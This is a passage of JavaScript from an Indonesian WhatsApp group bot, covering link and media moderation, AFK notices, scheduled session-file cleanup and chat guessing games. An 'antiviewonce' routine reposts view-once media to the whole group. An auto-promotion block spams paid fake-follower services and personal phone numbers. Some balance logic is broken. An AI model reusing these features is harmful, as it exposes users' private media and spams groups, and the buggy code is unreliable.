if (!isNumber(user.pc)) user.pc = Date.now() + toMs('1h')
} else db.users[sender] = {
jid: sender,
name: pushname,
date: calender,
limit: 100,
hitcmd: 0,
balance: 10000,
banned: false,
premium: false,
pc: Date.now() + toMs('1h'),
expired: Date.now() + toMs('7d')
}
} catch (err) {
console.error(err)
}
if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilinkch == true) {
var link = /https?:\/\/(whatsapp\.com\/channel\/[A-Za-z0-9]+)/; 
if (link.test(m.text) && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/`)
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Ditss.sendMessage(m.chat, {text: `*乂 [ Link Saluran Terdeteksi ] 乂*

@${m.sender.split("@")[0]} Maaf saya akan hapus, karna admin/ownerbot telah menyalakan fitur antilink saluran lain!`, mentions: [m.sender]}, {quoted: m})
await Ditss.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await Ditss.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}
        
if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].simi == true && !isCmd && !isSticker) {
try {
   let response = await fetch('https://api.simsimi.vn/v2/simtalk', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: new URLSearchParams({
                text: m.text,
                lc: 'id',
                key: ''
            })
        });

        let json = await response.json();
        m.reply("" + json.message);
} catch (e) {}
}        

if (m.isGroup && db.groups[m.chat].antisebut && m.type) {
if (m.type === "groupStatusMentionMessage"){
if (isAdmins || !isBotAdmins){
} else {
return Ditss.sendMessage(m.chat, {delete: {remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant}})
}
}
}

// Fungsi untuk fitur anti stiker
if (m.isGroup && db.groups[m.chat].antisticker && m.type) {
if (m.type === "stickerMessage"){
if (isAdmins || !isBotAdmins){
} else {
return Ditss.sendMessage(m.chat, {delete: {remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant}})
}
}
}
        //plwr2
// Fungsi untuk fitur anti pesan sekali lihat
if (m.isGroup && db.groups[m.chat].antiviewonce && m.type == 'viewOnceMessageV2') {
    let msg = { ...m }
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return Ditss.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return Ditss.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return Ditss.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    }
}

// Fungsi untuk fitur anti media
if (m.isGroup && db.groups[m.chat].antimedia && isMedia) {
if (isAdmins || !isBotAdmins){
} else {
return Ditss.sendMessage(m.chat, {delete: {remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant}})
}
}

// Fungsi untuk fitur anti gambar
if (m.isGroup && db.groups[m.chat].antiimage && m.type) {
if (m.type === "imageMessage"){
if (isAdmins || !isBotAdmins){
} else {
return Ditss.sendMessage(m.chat, {delete: {remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant}})
}
}
}

// Fungsi untuk fitur anti video
if (m.isGroup && db.groups[m.chat].antivideo && m.type) {
if (m.type === "videoMessage"){
if (isAdmins || !isBotAdmins){
} else {
return Ditss.sendMessage(m.chat, {delete: {remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant}})
}
}
}
// Fungsi untuk fitur anti audio
if (m.isGroup && db.groups[m.chat].antiaudio && m.type) {
if (m.type === "audioMessage"){
if (isAdmins || !isBotAdmins){
} else {
return Ditss.sendMessage(m.chat, {delete: {remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant}})
}
}
}

// Fungsi untuk fitur anti polling
if (m.isGroup && db.groups[m.chat].antipoll && m.type) {
if (m.type === "pollCreationMessageV3"){
if (isAdmins || !isBotAdmins){
} else {
return Ditss.sendMessage(m.chat, {delete: {remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant}})
}
}
}

// Fungsi untuk fitur anti lokasi
if (m.isGroup && db.groups[m.chat].antilocation && m.type) {
if (m.type === "locationMessage"){
if (isAdmins || !isBotAdmins){
} else {
return Ditss.sendMessage(m.chat, {delete: {remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant}})
}
}
}

// Fungsi untuk fitur anti dokumen
if (m.isGroup && db.groups[m.chat].antidocument && m.type) {
if (m.type === "documentMessage"){
if (isAdmins || !isBotAdmins){
} else {
return Ditss.sendMessage(m.chat, {delete: {remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant}})
}
}
}

// Fungsi untuk fitur anti kontak
if (m.isGroup && db.groups[m.chat].anticontact && m.type) {
if (m.type === "contactMessage"){
if (isAdmins || !isBotAdmins){
} else {
return Ditss.sendMessage(m.chat, {delete: {remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant}})
}
}
}

//pler
if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await Ditss.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Ditss.sendMessage(m.chat, {text: `*乂 [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await Ditss.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await Ditss.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}

if (m.isGroup && db.groups[m.chat].antisebut && m.type) {
if (m.type === "statusMentionMessage"){
if (isAdmins || !isBotAdmins){
} else {
return Ditss.sendMessage(m.chat, {delete: {remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant}})
}
}
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await Ditss.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Ditss.sendMessage(m.chat, {text: `*乂 [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await Ditss.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await Ditss.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}
        

let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`${tag} sedang *Afk* ${reason ? 'karena ' + reason : 'tanpa alasan'} selama *${clockString(new Date - afkTime)}*
`.trim())
}
if (global.db.users[sender].afkTime > -1) {
let user = global.db.users[sender]
m.reply(`${tag} telah kembali dari *Afk* ${user.afkReason ? 'setelah ' + user.afkReason : ''}\nselama *${clockString(new Date - user.afkTime)}*`.trim())
user.afkTime = -1
user.afkReason = ''
}
//bts

// Auto download tiktok

if ((budy.match) && ["kon", "kont", "kntl", "tolol", "tll", "pler", "woy", "mek", "jawir", "anj", "suki", "yaudah", "titit", "anjay", "mmk", "asu", "Ajg", "ajg", "kontol", "Kontol", "puki", "Puki", "yatim", "Yatim", "memek", "Memek", "asu", "Asu", "ngtd", "Ngtd"].includes(budy)) {
Ditss.sendMessage(m.chat, { audio: fs.readFileSync('./source/media/vn/toxic.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
}
if ((budy.match) && ["Assalamualaikum", "assalamualaikum", "Assalamu'alaikum", "asalamualaikum", "samlikum", "mikum", "asalamuallaikum"].includes(budy)) {
let plerDits = `https://files.catbox.moe/xhuq46.mp3`
Ditss.sendMessage(m.chat, {audio: {url: plerDits}, mimetype: 'audio/mpeg', ptt: true }, { quoted: m})
}
        
if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await Ditss.sendMessage(m.chat, {text: `
*${global.namaOwner} Menyediakan 🌟*
* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.

*🏠 Join Grup Bebas Promosi*
* *Grup Bebas Promosi 1 :*
https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy
* *Grup Bebas Promosi 2 :*
https://chat.whatsapp.com/CWO0TqYeCVbIoY4YzsTxb7
* *Channel Testimoni :*
https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s

*👤 Contact*
* *WhatsApp Utama :*
+6281513607731
* *WhtasApp Cadangan :*
+628386890336
https://t.me/skyzodev
`}, {quoted: null})
}
}
//?m
const getcomandces = (cases) => {
    try {
        const fileContent = fs.readFileSync('./case.js').toString();
        let caseContent = fileContent.split(`case '${cases}'`);    
        if (caseContent.length === 1) { 
            caseContent = fileContent.split(`case "${cases}"`);
        }
        if (caseContent.length > 1) {
            return "case " + `'${cases}'` + caseContent[1].split("break")[0] + "break";
        } else {
            return "none"; 
        }
    } catch (e) {
        return "none";
    }
};
let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
let mean;
let didyoumenn;
async function spawndidyou(our) {
try {
	const code = fs.readFileSync("./case.js", "utf8")
		const regex = /case\s+['"]([^'"]+)['"]:/g;
			var matches = [];
				var match;
				while ((match = regex.exec(code))) {
					matches.push(match[1]);
				}
				const help = Object.values(matches).flatMap(v => v ?? []).map(entry => entry.trim().split(' ')[0].toLowerCase()).filter(Boolean);
				if (!help.includes(our) && !budy.startsWith('$ ') && !budy.startsWith('> ')) {
					 mean = didyoumean(our, help);
				let sim = similarity(our, mean);
			let similarityPercentage = parseInt(sim * 100);
		if (mean && our.toLowerCase() !== mean.toLowerCase()) {
    	 didyoumenn = `*\`[ MATCH FOR THIS COMMAND ]\`*\n\nmungkin yang anda maksud adalah: *.${mean}*\npercentase: *${similarityPercentage}%*`
			   /*
			  # similarityPercentage
			  # mean
			  # thaks rijal
			  */
	     } else { return; }
     }
      return m.reply("kek nya ada yang salah")
 } catch(err) {
 return;
 }
}

if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
//await m.reply(check.respon)
await Ditss.sendMessage(m.chat, { audio: fs.readFileSync('./source/media/vn/spam.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
}
}
// PENGALIH
if (isCmd && isBanned) return reply('anda di banned oleh owner karna spam!')
//===============
        if (isCmd) {
      if (!isCreator && !isPremium && db.users[m.sender].limit < 1) return m.reply("limit anda habis😹 limit akan di riset pada jam 00:00");
db.users[m.sender].hitcmd += 1;
db.users[m.sender].limit -= 1;

    // }
} else {
}
//============= [ FUNCTION ] ======================================================
 // FUNCTION RESET ALL USER LIMIT 24 JAM
cron.schedule('0 0 0 * * *', () => {
Object.values(users).filter(v => v.premium == false).map(v => v.limit = 100);
Object.values(users).filter(v => v.premium == true).map(v => v.limit = 800);
}, { scheduled: true, timezone: 'Asia/Jakarta' });

cron.schedule('0 0 18 * * *', async () => {
fs.readdir("./session", async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return 
} 
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
 )
console.log(filteredArray.length); 
let teks =`hy owner ${salam}, terdeteksi ${filteredArray.length} file session\n\n`
if(filteredArray.length == 0) return 
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
}) 
console.log(filteredArray.length); 
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
console.log(filteredArray.length); 
});
}, { scheduled: true, timezone: 'Asia/Jakarta' })
        //momok
cron.schedule('0 0 19 * * *', async () => {
fs.readdir("./session", async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return 
} 
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
 )
console.log(filteredArray.length); 
let teks =`hy owner ${salam}, terdeteksi ${filteredArray.length} file session\n\n`
if(filteredArray.length == 0) return 
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
}) 
console.log(filteredArray.length); 
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
console.log(filteredArray.length); 
});
}, { scheduled: true, timezone: 'Asia/Jakarta' })
//momok
cron.schedule('0 0 20 * * *', async () => {
fs.readdir("./session", async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return 
} 
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
 )
console.log(filteredArray.length); 
let teks =`hy owner ${salam}, terdeteksi ${filteredArray.length} file session\n\n`
if(filteredArray.length == 0) return 
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
}) 
console.log(filteredArray.length); 
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
console.log(filteredArray.length); 
});
}, { scheduled: true, timezone: 'Asia/Jakarta' })

// FUNCTION SUIT PVP POLLING 
let roof = Object.values(suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(sender))
if (roof) {
let win = ''
let tie = false
if (sender == roof.p2 && /^(acc(ept)?|y|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(body) && m.isGroup && roof.status == 'wait') {
if (/^(gamau|nanti|ga(k.)?bisa)/i.test(body)) {
minSaldo(m.sender, 1000, db_saldo)
pokl = `@${roof.p2.split('@')[0]} menolak suit, suit dibatalkan\nDan player dikenakan sanksi -1000 balance karna menolak ajakan pemain`
await Ditss.sendText(from, pokl, m)
delete suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)

teksbbb = `AYO PILIH SUIT MU`
ggy = `Suit telah dikirimkan ke chat

@${roof.p.split('@')[0]} dan @${roof.p2.split('@')[0]}

Silahkan pilih suit di chat masing"
klik wa.me/${botNumber.split('@')[0]}`
await Ditss.sendText(from, ggy, fsaluran)
if (!roof.pilih) await Ditss.sendPoll(roof.p, teksbbb, [`batu`,`kertas`,`gunting`, ])
if (!roof.pilih2) await Ditss.sendPoll(roof.p2, teksbbb, [`batu`,`kertas`,`gunting`, ])
roof.waktu_milih = setTimeout(async() => {
if (!roof.pilih && !roof.pilih2) await Ditss.sendMessage(from, {text: `Kedua pemain tidak niat main,\nSuit dibatalkan`})
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
minSaldo(m.sender, 1000, db_saldo)
sffp = `@${(roof.pilih ? roof.p2 : roof.p).split('@')[0]} tidak memilih suit, game berakhir\nDan Player dikenakan sanksi pengurangan Rp. 1,000 saldo karna menolak ajakan pemain`
await m.reply(sffp)
}
delete suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = sender == roof.p
let jwb2 = sender == roof.p2
let g = /.gunting/i
let b = /.batu/i
let k = /.kertas/i
let reg = /^(.gunting|.batu|.kertas)/i
if (jwb && reg.test(body) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(body.toLowerCase())[0]
roof.text = body
await Ditss.sendMessage(from, {text: `Kamu telah memilih ${body} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`}, {quoted:fsaluran})
if (!roof.pilih2) await Ditss.sendMessage(roof.p2, {text: '_Lawan sudah memilih_\nSekarang giliran kamu'})
}
if (jwb2 && reg.test(body) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(body.toLowerCase())[0]
roof.text2 = body

tyu = `Kamu telah memilih ${body} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`
await Ditss.sendMessage(from, {text: tyu}, {quoted:m})

if (!roof.pilih) await Ditss.sendMessage(roof.p, {text: '_Lawan sudah memilih_\nSekarang giliran kamu'})
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
await Ditss.sendText(roof.asal, `${tie ? '*HASIL SERI*\n\n' : ''}@${roof.p.split('@')[0]} *${roof.text}* ${tie ? '' : roof.p == win ? ' Menang' : ' Kalah'}\n@${roof.p2.split('@')[0]} *${roof.text2}* ${tie ? '' : roof.p2 == win ? ' Menang' : ' Kalah'}${tie ? '' : '\n\nHadiah Saldo : 2,000 '}`, f1('HASIL SUIT PVP', null))
if (roof.p == win) {
roof.p == win ? minSaldo(users[roof.p], 2000, db_saldo) : minSaldo(users[roof.p], 1000, db_saldo)
} else if (roof.p2 == win) {
roof.p2 == win ? addSaldo(users[roof.p2], 2000, db_saldo) : minSaldo(users[roof.p2], 1000, db_saldo)
}
delete suit[roof.id]
}
}



function monospace(string) {
return '```' + string + '```'
}
function monospa(string) {
return '`' + string + '`'
}
function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomNomor(min, max = null){
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
}
// FUNCTION PETAK BOMB 
let pilih = "🌀", bomb = "💣";
if (sender in petakbom) {
if (!/^[1-9]|10$/i.test(body) && !isCmd) return !0;
if (petakbom[sender].petak[parseInt(body) - 1] === 1) return !0;
if (petakbom[sender].petak[parseInt(body) - 1] === 2) {
petakbom[sender].board[parseInt(body) - 1] = bomb;
petakbom[sender].pick++;
Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
petakbom[sender].bomb--;
petakbom[sender].nyawa.pop();

let brd = petakbom[sender].board;
if (petakbom[sender].nyawa.length < 1) {
await m.reply(`*GAME TELAH BERAKHIR*\nKamu terkena bomb\n\n ${brd.join("")}\n\n*Terpilih :* ${petakbom[sender].pick}\n*Pengurangan Saldo :* Rp. 100`);
Ditss.sendMessage(m.chat, {react: {text: '😂', key: m.key}})
minSaldo(sender, 100, db_saldo)
delete petakbom[sender];
} else await m.reply(`*PILIH ANGKA*\n\nKamu terkena bomb\n ${brd.join("")}\n\nTerpilih: ${petakbom[sender].pick}\nSisa nyawa: ${petakbom[sender].nyawa}`);
return !0;
}
if (petakbom[sender].petak[parseInt(body) - 1] === 0) {
petakbom[sender].petak[parseInt(body) - 1] = 1;
petakbom[sender].board[parseInt(body) - 1] = pilih;
petakbom[sender].pick++;
petakbom[sender].lolos--;
let brd = petakbom[sender].board;
if (petakbom[sender].lolos < 1) {
await m.reply(`*KAMU HEBAT ಠ⁠ᴥ⁠ಠ*\n\n${brd.join("")}\n\n*Terpilih :* ${petakbom[sender].pick}\n*Sisa nyawa :* ${petakbom[sender].nyawa}\n*Bomb :* ${petakbom[sender].bomb}\n*Hadiah Saldo :* Rp. 250`);
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})
addSaldo(q.split(`250`)[0]+"@s.whatsapp.net", Number(q.split(`${m.sender}`)[1]), db_saldo)
delete petakbom[sender];
} else m.reply(`*PILIH ANGKA*\n\n${brd.join("")}\n\nTerpilih : ${petakbom[sender].pick}\nSisa nyawa : ${petakbom[sender].nyawa}\nBomb : ${petakbom[sender].bomb}`)
}
}
// GAME TEBAK GAMBAR 

if ((from in tebakgambar)) {
let { soal, jawaban, hadiah, waktu } = tebakgambar[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*LEMAH BET KNTOL*\n\nJawabannya adalah *${tebakgambar[from].jawaban}*`);
delete tebakgambar[from]
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 150`);
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})
addSaldo(m.sender, 150, db_saldo)
clearTimeout(waktu);
delete tebakgambar[from];
} else Ditss.sendMessage(sender, {react: {text: '❌', key: m.key}})
if (similarity(m.text, userdb.jawaban) >= threshold) return m.reply("*Hampir benar. . .*")
}

// GAME TEBAK ANIME 
if ((from in tebakanime)) {
let { soal, jawaban, hadiah, waktu } = tebakanime[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*LEMAH BET KNTOL*\n\nJawabannya adalah *${jawaban}*`);
delete tebakanime[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})

clearTimeout(waktu);
delete tebakanime[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK LAGU 
if ((from in tebaklagu)) {
let { soal, jawaban, hadiah, waktu } = tebaklagu[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*LEMAH BET KNTOL*\n\nJawabannya adalah *${jawaban}*`);
delete tebaklagu[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})

clearTimeout(waktu);
delete tebaklagu[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME KUIS 
if ((from in kuis)) {
let { soal, jawaban, hadiah, waktu } = kuis[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*LEMAH BET KNTOL*\n\nJawabannya adalah *${jawaban}*`);
delete kuis[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})

clearTimeout(waktu);
delete kuis[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME SIAPAKAH AKU 
if ((from in siapakahaku)) {
let { soal, jawaban, hadiah, waktu } = siapakahaku[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*LEMAH BET KNTOL*\n\nJawabannya adalah *${jawaban}*`);
delete siapakahaku[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})

clearTimeout(waktu);
delete siapakahaku[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK KALIMAT 
if ((from in tebakkalimat)) {
let { soal, jawaban, hadiah, waktu } = tebakkalimat[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*LEMAH BET KNTOL*\n\nJawabannya adalah *${jawaban}*`);
delete tebakkalimat[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})
clearTimeout(waktu);
delete tebakkalimat[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK KATA 
if ((from in tebakkata)) {
let { soal, jawaban, hadiah, waktu } = tebakkata[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*LEMAH BET KNTOL*\n\nJawabannya adalah *${jawaban}*`);
delete tebakkata[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n\n*Game :* Tebak Kata\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})
clearTimeout(waktu);
delete tebakkata[from];
} else await Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

//oke
// GAME TEBAK LIRIK 
if ((from in tebaklirik)) {
let { soal, jawaban, hadiah, waktu } = tebaklirik[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*LEMAH BET KNTOL*\n\nJawabannya adalah *${jawaban}*`);
delete tebaklirik[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})

clearTimeout(waktu);
delete tebaklirik[from];
} else await Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK KIMIA 
if ((from in tebakkimia)) {
let { soal, jawaban, hadiah, waktu } = tebakkimia[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*LEMAH BET KNTOL*\n\nJawabannya adalah *${jawaban}*`);
delete tebakkimia[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})
clearTimeout(waktu);
delete tebakkimia[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME TEBAK BENDERA 
if ((from in tebakbendera)) {
let { soal, jawaban, hadiah, waktu } = tebakbendera[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*LEMAH BET KNTOL*\n\nJawabannya adalah *${jawaban}*`);
delete tebakbendera[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})

clearTimeout(waktu);
delete tebakbendera[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME ASAH OTAK 
if ((from in asahotak)) {
let { soal, jawaban, hadiah, waktu } = asahotak[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*LEMAH BET KNTOL*\n\nJawabannya adalah *${jawaban}*`);
delete asahotak[from];
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 200`);
addSaldo(m.sender, 200, db_saldo)
Ditss.sendMessage(m.chat, {react: {text: '🎉', key: m.key}})

clearTimeout(waktu);
delete asahotak[from];
} else Ditss.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}

// GAME SUSUN KATA 
if ((from in susunkata)) {
let { soal, jawaban, hadiah, waktu } = susunkata[from]
if (budy.toLowerCase() == "nyerah") {
